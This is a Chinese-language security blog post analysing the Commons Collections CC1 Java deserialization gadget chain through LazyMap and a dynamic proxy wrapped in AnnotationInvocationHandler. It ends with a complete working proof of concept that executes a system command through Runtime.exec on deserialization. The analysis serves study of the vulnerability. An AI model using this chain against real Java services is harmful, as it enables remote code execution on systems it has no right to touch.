---
title: JAVA反序列化之CC1--LazyMap
date: 2023/5/1 15:20:25
categories:
- Java
tags:
- 反序列化
---



# CC1--lazyMap chains

**ysoserial中cc1链使用的是LazyMap**

## 前置知识java代理

https://y4er.com/posts/java-proxy/

关键点

**被动态代理的对象调用任意方法都会通过对应的InvocationHandler的invoke方法触发**



## 分析

危险方法是`InvokerTransformer.transform()`，之前使用的是 TransformedMap 下的 checkSetValue 方法来调用，这次用LazyMap 下的 get 方法调用 factory.transform

![image-20220115100212144](..//images/bc583ebe2ca03158524014c0e27c3392.png)

**get方法**

![image-20230930134701285](..//images/image-20230930134701285.png)

**谁调用了get方法**

![image-20220115103043004](..//images/b6b801a95373e418363d74b1f56f1edd.png)

可以看到是`sun.reflect.annotation.AnnotationInvocationHandler` 中的invoke方法，结合动态代理可以知道invoke 方法在对象代理时会被触发。而实际上这个类实际就是一个`InvocationHandler`，我们如果将这个对象用Proxy进行代理，那么在`readObject`的时候，只要调用任意方法，就会进入到`AnnotationInvocationHandler#invoke`方法中，进而触发我们的`LazyMap#get`。

```java
// 构建对象
Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
// 创建LazyMap的handler实例
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap);
// 创建LazyMap的动态代理实例
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);  // 动态代理对象，执行任意方法，都会到invoke中去
```

代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是 `sun.reflect.annotation.AnnotationInvocationHandler#readObject`，所以我们还需要再用`AnnotationInvocationHandler`对这个proxyMap进行包裹（我们需要的是`AnnotationInvocationHandler`这个类的对象）

```java
// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues
handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); 
```

**完整poc**

```java
public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),};

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

		// 构建对象
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        // 创建LazyMap的handler实例
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        // 创建LazyMap的动态代理实例
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        serialize(handler);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
```

![image-20230930143412695](..//images/image-20230930143412695.png)